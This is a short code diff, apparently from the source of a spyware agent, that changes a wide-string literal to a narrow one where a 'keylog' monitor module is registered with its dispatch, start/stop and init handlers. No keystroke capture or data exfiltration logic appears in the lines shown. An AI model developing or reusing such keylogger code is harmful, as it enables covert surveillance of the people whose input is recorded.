@@ -715,5 +715,5 @@ DWORD WINAPI PM_KeyLogInit(JSONObject elem)
 
 void PM_KeyLogRegister()
 {
-	AM_MonitorRegister(L"keylog", PM_KEYLOGAGENT, (BYTE *)PM_KeyLogDispatch, (BYTE *)PM_KeyLogStartStop, (BYTE *)PM_KeyLogInit, NULL);
+	AM_MonitorRegister("keylog", PM_KEYLOGAGENT, (BYTE *)PM_KeyLogDispatch, (BYTE *)PM_KeyLogStartStop, (BYTE *)PM_KeyLogInit, NULL);
 }
